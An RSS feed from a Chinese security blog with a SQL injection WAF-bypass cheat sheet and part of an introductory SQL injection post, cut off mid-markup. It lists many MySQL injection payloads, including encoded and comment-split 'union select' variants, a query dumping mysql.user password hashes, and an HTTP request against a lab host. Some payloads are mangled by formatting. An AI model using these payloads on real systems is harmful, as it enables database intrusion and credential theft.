<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>云逸&#39;bolg • Posts by &#34;sql注入&#34; category</title>
        <link>http://gyzero.shop</link>
        <description></description>
        <language>zh-CN</language>
        <pubDate>Tue, 31 Oct 2023 08:53:37 +0800</pubDate>
        <lastBuildDate>Tue, 31 Oct 2023 08:53:37 +0800</lastBuildDate>
        <item>
            <guid isPermalink="true">http://gyzero.shop/2023/10/31/%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/</guid>
            <title>sql注入绕过</title>
            <link>http://gyzero.shop/2023/10/31/%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/</link>
            <pubDate>Tue, 31 Oct 2023 08:53:37 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;&lt;span class=&#34;spoiler bulr&#34; title=&#34;...&#34;&gt;欢迎观看&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;大小写绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#大小写绕过&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;kbd&#34;&gt;大小写绕过&lt;/span&gt;&lt;/h3&gt;
&lt;p class=&#34;rainbow&#34;&gt;将字符串设置为大小写，例如&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;and 1=1 转成 AND 1=1 AnD 1= 1&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;select * from users where id=1 UNION SELECT 1,2,3,4&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;select * from users where id=1 UniON SelECT 1,2,3,4&lt;/p&gt;
&lt;h3 class=&#34;kbd&#34; id=&#34;浮点数绕过注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#浮点数绕过注入&#34;&gt;#&lt;/a&gt; [浮点数绕过注入]&lt;/h3&gt;
&lt;p class=&#34;rainbow&#34;&gt;select * from users where id=8E0union select 1,2,3,4; &lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;select * from users where id=8.0union select  1,2,3,4&lt;/p&gt;
&lt;h3 id=&#34;null-值绕-过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#null-值绕-过&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;kbd&#34;&gt;NULL 值绕 过&lt;/span&gt;&lt;/h3&gt;
&lt;p class=&#34;rainbow&#34;&gt;select \N;  \N 代表空&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;select * from users where id=\Nunion select 1,2,3,\N;&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;select * from users where id=\Nunion select 1,2,3,\Nfrom users; &lt;/p&gt;
&lt;h3 id=&#34;引号绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#引号绕过&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;kbd&#34;&gt;引号绕过  &lt;/span&gt;&lt;/h3&gt;
&lt;p class=&#34;rainbow&#34;&gt;如果 waf 拦截过滤单引号的时候，可以使用双引号 在 mysql 里也可以用双引号作为字符串。&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;select * from users where id=‘1’;&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;select * from users where id=“1”; &lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;也可以将字符串转换成 16 进制 再进行查询。&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;select hex(‘admin’); &lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;select * from users where username=‘admin’;&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;select * from users where username=0x61646D696E; &lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;如果 gpc 开启了，但是注入点是整形 也可以用 hex 十六进制进行绕过&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;select * from users where id=-1 union select 1,2,(select group_concat(column_name) from {.rainbow}information_schema.columns where TABLE_NAME=‘users’ limit 1),4;&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;select * from users where id=-1 union select 1,2,(select group_concat(column_name) from {.rainbow}information_schema.columns where TABLE_NAME=0x7573657273 limit 1),4;&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;可以看到存在整型注入的时候 没有用到单引号 所以可以注入&lt;/p&gt;
&lt;h3 id=&#34;添加库名绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#添加库名绕过&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;kbd&#34;&gt;添加库名绕过 &lt;/span&gt;&lt;/h3&gt;
&lt;p class=&#34;rainbow&#34;&gt;以下两条查询语句，执行的结果是一致的，但是有些 waf 的拦截规则 并不会拦截 [库名].[表名] 这种模式。&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;select * from users where id=-1 union select 1,2,3,4 from users;&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;select * from users where id=-1 union select 1,2,3,4 from &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2FkbWluLnVz&#34;&gt;admin.us&lt;/span&gt; &lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;mysql 中也可以添加库名查询表。例如跨库查询 mysql 库里的 usrs 表的内容。 select * from users where id=-1 union select 1,2,3,concat (user,authentication_string) from mysql.user;&lt;/p&gt;
&lt;h3 id=&#34;去重复绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#去重复绕过&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;kbd&#34;&gt;去重复绕过  &lt;/span&gt;&lt;/h3&gt;
&lt;p class=&#34;rainbow&#34;&gt;在 mysql 查询可以使用 distinct 去除查询的重复值。可以利用这点突破 waf 拦截&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;select * from users where id=-1 union distinct select 1,2,3,4 from users;&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;select * from users where id=-1 union distinct select 1,2,3,version() from users; &lt;/p&gt;
&lt;h3 id=&#34;反引号绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#反引号绕过&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;kbd&#34;&gt;反引号绕过  &lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;在 mysql 可以使用  &lt;code&gt;这里是反引号&lt;/code&gt;  绕过一些 waf 拦截。字段可以加反引号或者不加，意义相同。&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;insert into users(username,password,email)values(‘admin’,‘123456’,‘admin@admin.com’);&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;insert into users( &lt;code&gt;username&lt;/code&gt; , &lt;code&gt;password&lt;/code&gt; , &lt;code&gt;email&lt;/code&gt; )values(‘admin’,‘123456’,‘admin@admin.com’); &lt;/p&gt;
&lt;h3 id=&#34;脚本语言特性绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#脚本语言特性绕过&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;kbd&#34;&gt;脚本语言特性绕过&lt;/span&gt;&lt;/h3&gt;
&lt;p class=&#34;rainbow&#34;&gt;在 php 语言中 id=1&amp;amp;id=2 后面的值会自动覆盖前面的值，不同的语言有不同的特性。可以利用这点绕过一 些 waf 的拦截。&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;id=1%00&amp;amp;id=2 union select 1,2,3&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;有些 waf 会去匹配第一个 id 参数 1%00 %00 是截断字符，waf 会自动截断 从而不会检测后面的内容。到了 程序中 id 就是等于 id=2 union select 1,2,3 从绕过注入拦截。 其他语言特性 &lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/jkjkjk.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;逗号绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#逗号绕过&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;kbd&#34;&gt;逗号绕过  &lt;/span&gt;&lt;/h3&gt;
&lt;p class=&#34;rainbow&#34;&gt;目前有些防注入脚本都会逗号进行拦截，例如常规注入中必须包含逗号&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;select * from users where id=1 union select 1,2,3,4;&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;一般会对逗号过滤成空 select * from users where id=1 union select 1 2 3 4; 这样 SQL 语句就会出错。 所以 可以不使用逗号进行 SQL &lt;/p&gt;
&lt;h4 id=&#34;substr-截取字符串&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#substr-截取字符串&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;kbd&#34;&gt;substr 截取字符串&lt;/span&gt;&lt;/h4&gt;
&lt;p class=&#34;rainbow&#34;&gt;select(substr(database() from 1 for 1));&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;查询当前库第一个字符 查询 m 等于 select (substr (database () from 1 for 1)) 页面返回正常&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;select * from users where id=1 and ‘m’=(select(substr(database() from 1 for 1)));&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;可以进一步优化 m 换成 hex 0x6D 这样就避免了单引号&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;select * from users where id=1 and 0x6D=(select(substr(database() from 1 for 1))); &lt;/p&gt;
&lt;h4 class=&#34;kbd&#34; id=&#34;min-截取字符串&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#min-截取字符串&#34;&gt;#&lt;/a&gt; [min 截取字符串]&lt;/h4&gt;
&lt;p class=&#34;rainbow&#34;&gt;这个 min 函数跟 substr 函数功能相同 如果 substr 函数被拦截或者过滤可以使用这个函数代替。&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;select mid (database () from 1 for 1); 这个方法如上。&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;select * from users where id=1 and ‘m’=(select(mid(database() from 1 for 1)));&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;select * from users where id=1 and 0x6D=(select(mid(database() from 1 for 1))); &lt;/p&gt;
&lt;h4 id=&#34;使用-join-绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#使用-join-绕过&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;kbd&#34;&gt;使用 join 绕过 &lt;/span&gt;&lt;/h4&gt;
&lt;p class=&#34;rainbow&#34;&gt;使用 join 自连接两个表 union select 1,2 #等价于 union select * from (select 1) a join (select 2) b a 和 b 分别是表的别名&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;select * from users where id=-1 union select 1,2,3,4;&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;select * from users where id=-1 union select * from (select 1)a join (select 2)b join(select 3)c join(select 4)d;&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;select * from users where id=-1 union select * from (select 1)a join (select 2)b join(select user())c join(select 4)d;&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;可以看到这里也没有使用逗号，从而绕过 waf &lt;/p&gt;
&lt;h4 class=&#34;kbd&#34; id=&#34;like-绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#like-绕过&#34;&gt;#&lt;/a&gt; [like 绕过]&lt;/h4&gt;
&lt;p class=&#34;rainbow&#34;&gt;使用 like 模糊查询 select user () like ‘% r%’; 模糊查询成功返回 1 否则返回 0 找到第一个字符后继续进行下一个字符匹配。从而找到所有的字符串 最后就是要查询的内容，这种 SQL 注 入语句也不会存在逗号。从而绕过 waf 拦截 &lt;/p&gt;
&lt;h4 id=&#34;limit-offset-绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#limit-offset-绕过&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;kbd&#34;&gt;limit offset 绕过 &lt;/span&gt;&lt;/h4&gt;
&lt;p class=&#34;rainbow&#34;&gt;SQL 注入时，如果需要限定条目可以使用 limit 0,1 限定返回条目的数目 limit 0,1 返回条一条记录 如果 对逗号进行拦截时，可以使用 limit 1 默认返回第一条数据。也可以使用 limit 1 offset 0 从零开始返 回第一条记录，这样就绕过 waf &lt;/p&gt;
&lt;h3 class=&#34;kbd&#34; id=&#34;or-and-xor-not-绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#or-and-xor-not-绕过&#34;&gt;#&lt;/a&gt; [or and xor not 绕过]&lt;/h3&gt;
&lt;p class=&#34;rainbow&#34;&gt;目前主流的 waf 都会对 id=1 and 1=2、id=1 or 1=2、id=0 or 1=2 id=0 xor 1=1 limit 1 、id=1 xor 1=2 对这些常见的 SQL 注入检测语句进行拦截。像 and 这些还有字符代替 字符如下 &lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;and 等于 &amp;amp;&amp;amp;&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;or 等于 ||&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;not 等于！&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;xor 等于 |&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;所以可以转换成这样&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;id=1 and 1=1 等于 id=1 &amp;amp;&amp;amp; 1=1&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;id=1 and 1=2 等于 id=1 &amp;amp;&amp;amp; 1=2&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;id=1 or 1=1 等于 id=1 || 1=1&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;id=0 or 1=0 等于   id=0 || 1=0 &lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;可以绕过一些 waf 拦截继续对注入点进行安全检测&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;也可以使用运算符号&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;id=1 &amp;amp;&amp;amp; 2=1+1&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;id=1 &amp;amp;&amp;amp;   2=1-1 &lt;/p&gt;
&lt;h3 id=&#34;ascii-字符对比绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ascii-字符对比绕过&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;kbd&#34;&gt;ascii 字符对比绕过 &lt;/span&gt;&lt;/h3&gt;
&lt;p class=&#34;rainbow&#34;&gt;许多 waf 会对 union select 进行拦截 而且通常比较变态，那么可以不使用联合查询注入，可以使用字符 截取对比法，进行突破。&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;select substring(user(),1,1);&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;select * from users where id=1 and substring(user(),1,1)=‘r’;&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;select * from users where id=1 and ascii(substring(user(),1,1))=114;&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;最好把’r’换成成 ascii 码 如果开启 gpc int 注入就不能用了。 可以看到构造得 SQL 攻击语句没有使用联合查询 (union select) 也可以把数据查询出来 &lt;/p&gt;
&lt;h3 class=&#34;kbd&#34; id=&#34;等号绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#等号绕过&#34;&gt;#&lt;/a&gt; [等号绕过]&lt;/h3&gt;
&lt;p class=&#34;rainbow&#34;&gt;如果程序会对 = 进行拦截 可以使用 like rlike regexp 或者使用 &amp;lt;或者&amp;gt;&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;select * from users where id=1 and ascii(substring(user(),1,1))&amp;lt;115;&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;select * from users where id=1 and ascii(substring(user(),1,1))&amp;gt;115;&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;select * from users where id=1 and (select substring(user(),1,1)like ‘r%’);&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;select * from users where id=1 and (select substring(user(),1,1)rlike ‘r’) &lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;select * from users where id=1 and 1=(select user() regexp ‘^r’);&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;select * from users where id=1 and 1=(select user() regexp ‘^a’);&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;regexp 后面是正则 &lt;/p&gt;
&lt;h3 class=&#34;kbd&#34; id=&#34;双关键词绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#双关键词绕过&#34;&gt;#&lt;/a&gt; [双关键词绕过]&lt;/h3&gt;
&lt;p class=&#34;rainbow&#34;&gt;有些程序会对单词 union、 select 进行转空 但是只会转一次这样会留下安全隐患。 双关键字绕过（若删除掉第一个匹配的 union 就能绕过）&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;id=-1’UNIunionONSeLselectECT1,2,3–+ 到数据库里执行会变成 id=-1’UNION SeLECT1,2,3–+ 从而绕过注入 &lt;/p&gt;
&lt;h3 id=&#34;union-select-绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#union-select-绕过&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;kbd&#34;&gt;union select 绕过 &lt;/span&gt;&lt;/h3&gt;
&lt;p class=&#34;rainbow&#34;&gt;目前不少 waf 都会使用都会对 union select 进行拦截 单个不拦截 一起就进行拦截。&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;针对单个关键词绕过 sel&amp;lt;&amp;gt;ect 程序过滤 &amp;lt;&amp;gt; 为空 脚本处理&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;sele/&lt;strong&gt;/ct 程序过滤 /&lt;/strong&gt;/ 为空&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;/&lt;em&gt;!%53eLEct&lt;/em&gt;/url 编码与内联注释&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;se%0blect 使用空格绕过&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;sele% ct 使用百分号绕过&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;%53eLEct 编码绕过&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;大小写&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;uNIoN sELecT 1,2&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;union all select 1,2&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;union DISTINCT select 1,2&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;null+UNION+SELECT+1,2&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;/&lt;em&gt;!union&lt;/em&gt;//&lt;em&gt;!select&lt;/em&gt;/1,2&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;union/&lt;strong&gt;/select/&lt;/strong&gt;/1,2&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;and(select 1)=(Select 0xA&lt;em&gt;1000)/&lt;/em&gt;!uNIOn*//&lt;em&gt;!SeLECt&lt;/em&gt;/ 1,user() &lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;/&lt;em&gt;!50000union&lt;/em&gt;//&lt;em&gt;!50000select&lt;/em&gt;/1,2&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;/&lt;em&gt;!40000union&lt;/em&gt;//&lt;em&gt;!40000select&lt;/em&gt;/1,2&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;%0aunion%0aselect 1,2&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;%250aunion%250aselect 1,2&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;%09union%09select 1,2&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;%0caunion%0cselect 1,2&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;%0daunion%0dselect 1,2&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;%0baunion%0bselect 1,2&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;%0d%0aunion%0d%0aselect 1,2&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;–+%0d%0aunion–+%0d%0aselect–+%0d%0a1,–+%0d%0a2 /&lt;em&gt;!12345union&lt;/em&gt;//&lt;em&gt;!12345select&lt;/em&gt;/1,2;&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;/&lt;em&gt; 中文&lt;/em&gt; /union/&lt;em&gt; 中文&lt;/em&gt; /select/&lt;em&gt; 中文&lt;/em&gt; / 1,2;&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;/* &lt;em&gt;/union/&lt;/em&gt; */select/ */1,2;&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;/&lt;em&gt;!union&lt;/em&gt;//&lt;em&gt;!00000all&lt;/em&gt;//&lt;em&gt;!00000select&lt;/em&gt;/1,2 &lt;/p&gt;
&lt;h3 id=&#34;unicode-编码绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#unicode-编码绕过&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;kbd&#34;&gt;Unicode 编码绕过 &lt;/span&gt;&lt;/h3&gt;
&lt;p class=&#34;rainbow&#34;&gt;形式：“\u” 或者是 “% u” 加上 4 位 16 进制 Unicode 码值。&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;iis 会自动进行识别这种编码 有部分 waf 并不会拦截这这种编码&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;-1 union select 1,user()&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;部分转码&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;-1 uni%u006fn sel%u0065ct 1,user()&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;全部转码 {.rainbow}% u002d% u0031% u0020% u0075% u006e% u0069% u006f% u006e% u0020% u0073% u0065% u006c% u0065% u0063% u0074% u 0020% u0031% u002c% u0075% u0073% u0065% u0072% u0028% u0029 &lt;/p&gt;
&lt;h3 id=&#34;url-编码绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#url-编码绕过&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;kbd&#34;&gt;url 编码绕过 &lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;在 iis 里会自动把 url 编码转换成字符串传到程序中执行。 例如 union select 可以转换成 u%6eion s%65lect  94&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;POST /06/vul/sqli/sqli_id.php&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;HTTP/1.1 Host: 192.168.0.165&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0 Accept: {.rainbow}text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,&lt;em&gt;/&lt;/em&gt;;q=0.8&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;Accept-Encoding: gzip, deflate&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;Content-Type: application/x-www-form-urlencoded&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;Content-Length: 47&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;Origin: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xNjU=&#34;&gt;http://192.168.0.165&lt;/span&gt;&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;Connection: close Referer: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xNjUvMDYvdnVsL3NxbGkvc3FsaV9pZC5waHA=&#34;&gt;http://192.168.0.165/06/vul/sqli/sqli_id.php&lt;/span&gt;&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;Cookie: PHPSESSID=hk8r159en71pndlu3jvvphenn5&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;Upgrade-Insecure-Requests: 1&lt;/p&gt;
&lt;p class=&#34;rainbow&#34;&gt;id=-1 union%25OAselect%25OA1,user()-- &amp;amp;submit=1&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://gyzero.shop/2023/10/28/%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/</guid>
            <title>sql注入</title>
            <link>http://gyzero.shop/2023/10/28/%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/</link>
            <pubDate>Sat, 28 Oct 2023 19:09:44 +0800</pubDate>
            <description><![CDATA[ &lt;div class=&#34;note info&#34;&gt;
&lt;p&gt;对 mysql 不了解的不会语句的去看数据库篇&lt;/p&gt;
&lt;/div&gt;
&lt;h3 id=&#34;mysql数据库结构&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#mysql数据库结构&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;kbd&#34;&gt;mysql 数据库结构&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;mysql15 以后默认存放一个 infomation_schema 里面 这个库里面有很多表 重点是这三个表 columns 、tables、schemata 表字段 CHEMA_NAME 记录着库的信息&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;tables 表字段 TABLE_SCHEMA 、TABLE_NAME 分别记录着库名和表名&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;columns 存储该用户创建的所有数据库的库名、标名和字段名&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero3.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;查询 admin 库中所有表字段&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero4.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;查询某个库某个表的字段可以这样查询&lt;/p&gt;
&lt;p&gt;select * from information_schema.COLUMNS where TABLE_SCHEMA=‘admin’ and&lt;/p&gt;
&lt;p&gt;TABLE_NAME=‘admin’&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero5.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;sql注入原理&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sql注入原理&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;kbd&#34;&gt;sql 注入原理&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;SQL 注入漏洞的产生需要满足以下两个条件  参数用户可控：从前端传给后端的参数内容是用户可以控制的  参数带入数据库查询：传入的参数拼接到 SQL 语句，且带入数据库查询。&lt;/p&gt;
&lt;p&gt;当用户传入参数为 1’的时候，在数据库执行如下所示。&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; users &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; 此 SQL 语句不符合语法规则就会报错。&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;You have an error in your SQL syntax; check the manual that corresponds&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;to your MySQL server version for the right syntax to use near &#39;&#39;&#39;&lt;/span&gt; at line &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;当用户传入参数为 &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; 时 &lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span 